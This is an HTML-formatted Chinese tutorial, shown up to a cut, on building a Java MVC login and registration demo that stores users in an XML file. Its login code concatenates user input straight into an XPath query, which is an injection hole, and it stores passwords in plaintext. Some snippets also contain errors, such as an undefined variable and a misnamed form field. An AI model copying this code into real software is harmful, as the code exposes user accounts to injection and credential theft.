&lt;p&gt;我们使用MVC模式开发一个简单的用户登陆注册的案例吧！作为一个简单的用户登陆注册，这里就&lt;strong&gt;直接使用XML文档当作小型数据库吧&lt;/strong&gt;！&lt;/p&gt;
&lt;h3 id=&quot;搭建开发环境&quot;&gt;&lt;strong&gt;①搭建开发环境&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;导入相对应的开发包&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;创建程序的包名&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;创建xml文件，当做小型的数据库&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/JBlhA6c.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;开发实体user&quot;&gt;&lt;strong&gt;②开发实体User&lt;/strong&gt;&lt;/h3&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; id;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String username;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String password;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String email;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; Date birthday;

    &lt;span class=&quot;co&quot;&gt;//....各种setter、getter&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;开发dao&quot;&gt;&lt;strong&gt;③开发dao&lt;/strong&gt;&lt;/h3&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;这个根据业务来开发，我们是登陆注册，那应该提供什么功能呢？&lt;strong&gt;注册（外界传递一个User对象进来，我可以在XML文档多一条信息）。登陆（外界传递用户名和密码过来，我就在XML文档中查找有没该用户名和密码，如果有就返回一个User对象）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;3.1登陆功能&lt;/strong&gt;：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
    &lt;span class=&quot;co&quot;&gt;//外界传递用户名和密码进来，我要在XML文档中查找是否有该条记录&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; User &lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt;(String username, String password) {

        &lt;span class=&quot;co&quot;&gt;//得到XML文档的流对象&lt;/span&gt;
        InputStream inputStream = UserImplXML.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;getClassLoader&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;getResourceAsStream&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;user.xml&quot;&lt;/span&gt;);

        &lt;span class=&quot;co&quot;&gt;//得到dom4j的解析器对象&lt;/span&gt;
        SAXReader saxReader = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;SAXReader&lt;/span&gt;();


        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {

            &lt;span class=&quot;co&quot;&gt;//解析XML文档&lt;/span&gt;
            Document document = saxReader.&lt;span class=&quot;fu&quot;&gt;read&lt;/span&gt;(path);

            &lt;span class=&quot;co&quot;&gt;//使用XPATH技术，查找XML文档中是否有传递进来的username和password&lt;/span&gt;
            Element element = (Element) document.&lt;span class=&quot;fu&quot;&gt;selectSingleNode&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;//user[@username='&quot;&lt;/span&gt; + username + &lt;span class=&quot;st&quot;&gt;&quot;' and@password='&quot;&lt;/span&gt; + password + &lt;span class=&quot;st&quot;&gt;&quot;']&quot;&lt;/span&gt;);

            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (element == &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;) {
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;;
            }

            &lt;span class=&quot;co&quot;&gt;//如果有，就把XML查出来的节点信息封装到User对象，返回出去&lt;/span&gt;
            User user = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;User&lt;/span&gt;();
            user.&lt;span class=&quot;fu&quot;&gt;setId&lt;/span&gt;(Integer.&lt;span class=&quot;fu&quot;&gt;parseInt&lt;/span&gt;(element.&lt;span class=&quot;fu&quot;&gt;attributeValue&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;id&quot;&lt;/span&gt;)));
            user.&lt;span class=&quot;fu&quot;&gt;setUsername&lt;/span&gt;(element.&lt;span class=&quot;fu&quot;&gt;attributeValue&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;));
            user.&lt;span class=&quot;fu&quot;&gt;setPassword&lt;/span&gt;(element.&lt;span class=&quot;fu&quot;&gt;attributeValue&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;));
            user.&lt;span class=&quot;fu&quot;&gt;setEmail&lt;/span&gt;(element.&lt;span class=&quot;fu&quot;&gt;attributeValue&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;email&quot;&lt;/span&gt;));

            &lt;span class=&quot;co&quot;&gt;//生日就需要转换一下了，XML文档保存的是字符串，User对象需要的是Date类型&lt;/span&gt;
            SimpleDateFormat simpleDateFormat = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; SimpleDateFormat(&lt;span class=&quot;st&quot;&gt;&quot;yy-MM-dd&quot;&lt;/span&gt;);
            Date birthday = simpleDateFormat.&lt;span class=&quot;fu&quot;&gt;parse&lt;/span&gt;(element.&lt;span class=&quot;fu&quot;&gt;attributeValue&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;birthday&quot;&lt;/span&gt;));
            user.&lt;span class=&quot;fu&quot;&gt;setBirthday&lt;/span&gt;(birthday);

            &lt;span class=&quot;co&quot;&gt;//返回User对象出去&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; user;

        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (DocumentException e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
            &lt;span class=&quot;kw&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;st&quot;&gt;&quot;初始化时候出错啦！&quot;&lt;/span&gt;);
        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (ParseException e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
            &lt;span class=&quot;kw&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;st&quot;&gt;&quot;查询的时候出错啦！&quot;&lt;/span&gt;);
        }

    }
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;做完一个功能，最好就测试一下，看有没有错误再继续往下写！&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String username = &lt;span class=&quot;st&quot;&gt;&quot;zhongfucheng&quot;&lt;/span&gt;;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String password = &lt;span class=&quot;st&quot;&gt;&quot;123&quot;&lt;/span&gt;;

    &lt;span class=&quot;fu&quot;&gt;@Test&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;testLogin&lt;/span&gt;() {

        UserImplXML userImplXML = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;UserImplXML&lt;/span&gt;();
        User user = userImplXML.&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt;(username, password);

        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(user.&lt;span class=&quot;fu&quot;&gt;getBirthday&lt;/span&gt;());
        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(user.&lt;span class=&quot;fu&quot;&gt;getEmail&lt;/span&gt;());
        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(user.&lt;span class=&quot;fu&quot;&gt;getId&lt;/span&gt;());
        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(user.&lt;span class=&quot;fu&quot;&gt;getUsername&lt;/span&gt;());
        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(user.&lt;span class=&quot;fu&quot;&gt;getPassword&lt;/span&gt;());


    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/vDbAAdC.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;3.2注册功能&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;16&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;co&quot;&gt;//注册功能，外界传递一个User对象进来。我就在XML文档中添加一条信息&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(User user) {

    &lt;span class=&quot;co&quot;&gt;//获取XML文档路径！&lt;/span&gt;
    String path = UserImplXML.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;getClassLoader&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;getResource&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;user.xml&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;getPath&lt;/span&gt;();
        

        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {
            &lt;span class=&quot;co&quot;&gt;//获取dom4j的解析器，解析XML文档&lt;/span&gt;
            SAXReader saxReader = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;SAXReader&lt;/span&gt;();
            Document document = saxReader.&lt;span class=&quot;fu&quot;&gt;read&lt;/span&gt;(path);

            &lt;span class=&quot;co&quot;&gt;//在XML文档中创建新的节点&lt;/span&gt;
            Element newElement = DocumentHelper.&lt;span class=&quot;fu&quot;&gt;createElement&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;user&quot;&lt;/span&gt;);
            newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;id&quot;&lt;/span&gt;, String.&lt;span class=&quot;fu&quot;&gt;valueOf&lt;/span&gt;(user.&lt;span class=&quot;fu&quot;&gt;getId&lt;/span&gt;()));
            newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;, user.&lt;span class=&quot;fu&quot;&gt;getUsername&lt;/span&gt;());
            newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;email&quot;&lt;/span&gt;, user.&lt;span class=&quot;fu&quot;&gt;getEmail&lt;/span&gt;());
            newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;, user.&lt;span class=&quot;fu&quot;&gt;getPassword&lt;/span&gt;());

            &lt;span class=&quot;co&quot;&gt;//日期返回的是指定格式的日期&lt;/span&gt;
            SimpleDateFormat simpleDateFormat = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; SimpleDateFormat(&lt;span class=&quot;st&quot;&gt;&quot;yy-MM-dd&quot;&lt;/span&gt;);
            String date = simpleDateFormat&lt;span class=&quot;fu&quot;&gt;.format&lt;/span&gt;(user.&lt;span class=&quot;fu&quot;&gt;getBirthday&lt;/span&gt;());
            newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;birthday&quot;&lt;/span&gt;,date);

            &lt;span class=&quot;co&quot;&gt;//把新创建的节点增加到父节点上&lt;/span&gt;
            document.&lt;span class=&quot;fu&quot;&gt;getRootElement&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(newElement);

            &lt;span class=&quot;co&quot;&gt;//把XML内容中文档的内容写到硬盘文件上&lt;/span&gt;
            OutputFormat outputFormat = OutputFormat.&lt;span class=&quot;fu&quot;&gt;createPrettyPrint&lt;/span&gt;();
            outputFormat.&lt;span class=&quot;fu&quot;&gt;setEncoding&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;);
            XMLWriter xmlWriter = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;XMLWriter&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; FileWriter(path),outputFormat);
            xmlWriter.&lt;span class=&quot;fu&quot;&gt;write&lt;/span&gt;(document);
            xmlWriter.&lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;();

        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (DocumentException e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
            &lt;span class=&quot;kw&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;st&quot;&gt;&quot;注册的时候出错了！！！&quot;&lt;/span&gt;);
        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (IOException e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
            &lt;span class=&quot;kw&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;st&quot;&gt;&quot;注册的时候出错了！！！&quot;&lt;/span&gt;);
        }
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;我们也测试一下有没有错误！&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;13&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;fu&quot;&gt;@Test&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;testRegister&lt;/span&gt;() {

        UserImplXML userImplXML = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;UserImplXML&lt;/span&gt;();

        &lt;span class=&quot;co&quot;&gt;//这里我为了测试的方便，就添加一个带5个参数的构造函数了！&lt;/span&gt;
        User user = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;User&lt;/span&gt;(&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;nihao&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;123&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;sina@qq.com&quot;&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; Date());

        userImplXML.&lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(user);
    }
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;注意！&lt;strong&gt;测试的结果是在classes目录下的user.xml文件查询的&lt;/strong&gt;！因为&lt;strong&gt;我们是用Test来测试代码，读取XML文件时使用的是类装载器的方法，在编译后，按照WEB的结构目录，XML文件的读写是在WEB-INF的classes目录下的！&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Ipvulzn.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;DAO的实现已经开发完成了，接下来我们就对DAO的实现进行抽取。【当然了，也可以先写DAO再写DAO的实现】&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/zw1tLtB.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h3 id=&quot;开发service层&quot;&gt;&lt;strong&gt;④开发service层&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;service层的开发就非常简单了！上面已经说了，service层就是：&lt;strong&gt;将多个原子性的DAO操作进行组合，组合成一个完整的业务逻辑&lt;/strong&gt;。简单来说：&lt;strong&gt;对web层提供所有的业务服务的&lt;/strong&gt;！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在逻辑代码不是非常复杂的情况下，我们可以没有service层的&lt;/strong&gt;，这里还是演示一下吧！&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; UserServiceXML {
    
        &lt;span class=&quot;co&quot;&gt;//Service层就是调用Dao层的方法，我们就直接在类中创建Dao层的对象了&lt;/span&gt;
        UserDao userImplXML = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;UserImplXML&lt;/span&gt;();
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(User user) {
            userImplXML.&lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(user);
        }
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;login&lt;/span&gt;(String username, String password) {
    
            userImplXML.&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt;(username, password);
        }
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;当然了，&lt;strong&gt;为了更好的解耦，也把它抽取成接口&lt;/strong&gt;！&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/2pAJy2d.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h3 id=&quot;开发web层&quot;&gt;&lt;strong&gt;⑤开发web层&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 id=&quot;我们来先做注册的界面吧&quot;&gt;5.1我们来先做注册的界面吧！&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;提供注册界面的Servlet&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;16&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; RegisterUIServlet &lt;span class=&quot;kw&quot;&gt;extends&lt;/span&gt; javax.&lt;span class=&quot;fu&quot;&gt;servlet&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;http&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;HttpServlet&lt;/span&gt; {
        &lt;span class=&quot;kw&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;doPost&lt;/span&gt;(javax.&lt;span class=&quot;fu&quot;&gt;servlet&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;http&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;HttpServletRequest&lt;/span&gt; request, javax.&lt;span class=&quot;fu&quot;&gt;servlet&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;http&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;HttpServletResponse&lt;/span&gt; response) &lt;span class=&quot;kw&quot;&gt;throws&lt;/span&gt; javax.&lt;span class=&quot;fu&quot;&gt;servlet&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;ServletException&lt;/span&gt;, IOException {
    
            &lt;span class=&quot;co&quot;&gt;//直接跳转到显示注册界面的JSP&lt;/span&gt;
            request.&lt;span class=&quot;fu&quot;&gt;getRequestDispatcher&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/WEB-INF/register.jsp&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;forward&lt;/span&gt;(request, response);
    
        }
    
        &lt;span class=&quot;kw&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;doGet&lt;/span&gt;(javax.&lt;span class=&quot;fu&quot;&gt;servlet&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;http&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;HttpServletRequest&lt;/span&gt; request, javax.&lt;span class=&quot;fu&quot;&gt;servlet&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;http&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;HttpServletResponse&lt;/span&gt; response) &lt;span class=&quot;kw&quot;&gt;throws&lt;/span&gt; javax.&lt;span class=&quot;fu&quot;&gt;servlet&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;ServletException&lt;/span&gt;, IOException {
    
            &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;doPost&lt;/span&gt;(request, response);
        }
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;开发注册界面的JSP&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode jsp&quot;&gt;
&lt;code class=&quot;sourceCode jsp&quot;&gt;&amp;lt;h1&amp;gt;欢迎来到注册界面！&amp;lt;/h1&amp;gt;

&lt;span class=&quot;co&quot;&gt;&amp;lt;%--提交给处理注册的处理Servlet--%&amp;gt;&lt;/span&gt;

&amp;lt;form&lt;span class=&quot;ot&quot;&gt; method&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; action&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;&lt;/span&gt;${pageContext.request.contextPath}&lt;span class=&quot;dt&quot;&gt;/RegisterServlet&quot;&lt;/span&gt;&amp;gt;

    &amp;lt;table&amp;gt;
        &lt;span class=&quot;co&quot;&gt;&amp;lt;%--对于id来讲，是服务器分配的！不需要用户自己输入--%&amp;gt;&lt;/span&gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;用户名&amp;lt;/td&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;input&lt;span class=&quot;ot&quot;&gt; type&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;text &quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;密码&amp;lt;/td&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;input&lt;span class=&quot;ot&quot;&gt; type&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;password&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;确认密码&amp;lt;/td&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;input&lt;span class=&quot;ot&quot;&gt; type&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;password&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;邮箱&amp;lt;/td&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;input&lt;span class=&quot;ot&quot;&gt; type&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;email&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;生日&amp;lt;/td&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;input&lt;span class=&quot;ot&quot;&gt; type&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;text &quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;birethday&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;input&lt;span class=&quot;ot&quot;&gt; type&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;/td&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;input&lt;span class=&quot;ot&quot;&gt; type&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;reset&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;重置！&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
    &amp;lt;/table&amp;gt;
&amp;lt;/form&amp;gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;JSP页面是这样子的&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/SJ6Ro3R.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;接下来，&lt;strong&gt;我们要开发处理用户注册提交的Servlet&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
        &lt;span class=&quot;co&quot;&gt;//首先要接受Parameter的参数，封装到User里面去&lt;/span&gt;
        String username = request.&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;);
        String password = request.&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;);

        &lt;span class=&quot;co&quot;&gt;//......如果参数过多，我们就要写好多好多类似的代码了...&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;此时，我们应该想起&lt;strong&gt;反射机制中的BeanUtils开发包..为了更好地重用，我就将它写成一个工具类&lt;/strong&gt;！&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;13&quot;&gt;
